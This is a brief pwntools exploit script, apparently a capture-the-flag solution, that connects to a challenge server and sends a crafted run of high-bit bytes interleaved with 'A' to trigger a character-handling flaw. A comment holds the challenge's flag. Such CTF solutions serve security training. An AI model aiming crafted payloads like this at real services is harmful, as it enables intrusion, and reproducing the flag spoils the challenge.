#!/usr/bin/env python3
#bctf{wOw_YoU_sOlVeD_iT_665ff83d}
from pwn import *

io = remote("character-assassination.challs.pwnoh.io", 1337, ssl=True)
io.sendlineafter(b"> ", b''.join(b'A'+bytes([b]) for b in range(0x80,0x100)))
io.interactive()
